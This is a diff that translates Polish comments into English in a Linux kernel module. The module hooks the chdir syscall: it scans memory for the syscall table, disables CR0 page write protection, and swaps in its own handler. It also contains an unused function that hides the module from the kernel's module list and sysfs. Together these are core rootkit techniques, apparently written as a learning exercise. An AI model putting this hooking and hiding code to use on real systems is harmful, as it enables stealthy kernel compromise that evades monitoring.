@@ -14,7 +14,7 @@ unsigned long long **syscall_tab;
 unsigned long long orig_cr0;
 asmlinkage long long (*orig_chdir)(const char __user *filename); 
 
-/* funkcja do podmiany */
+/* function to replace syscall function */
 asmlinkage long long my_chdir(const char __user *filename)
 {
   long long ret;
@@ -23,14 +23,14 @@ asmlinkage long long my_chdir(const char __user *filename)
   return ret;
 }
 
-/* funkcja ukrywająca moduł- tutaj jeszcze nieużyta, ze względu na randomowe działanie modułu */
+/* function to hide module - it isn't use there yet */
 static void hide(void) 
 {
   list_del(&THIS_MODULE->list);
   kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 
-/* funkcja poszukująca syscall_table */
+/* function to search a syscall table */
 static unsigned long long **find(void) {
     unsigned long long **sctable;
     unsigned long long i = START_MEM;
@@ -56,18 +56,18 @@ static int __init init(void)
   }
   orig_chdir = (void *) syscall_tab[__NR_chdir];
   orig_cr0 = read_cr0();
-  write_cr0(orig_cr0 & ~0x10000); /* wyłączenie ochrony stron pamięci */
+  write_cr0(orig_cr0 & ~0x10000); /* disable page protect */
   printk("write_cr0");
-  syscall_tab[__NR_chdir] = (unsigned long long*) my_chdir;  /* podmiana wywołania systemowego */
+  syscall_tab[__NR_chdir] = (unsigned long long*) my_chdir;  /* replacing syscall */
   printk("po podmiance");
-  write_cr0(orig_cr0); /* włączenie ochrony stron pamięci */
+  write_cr0(orig_cr0); /* enable page protect */
   return 0;
 }
 
 static void __exit exitt(void)
 {
   write_cr0(orig_cr0 & (~0x10000));
-  syscall_tab[__NR_chdir] = (unsigned long long*) orig_chdir; /* przywrócenie pierwotnego wywołania systemowego */
+  syscall_tab[__NR_chdir] = (unsigned long long*) orig_chdir; /* replacing original syscall */
   write_cr0(orig_cr0);
 }
 module_init(init);
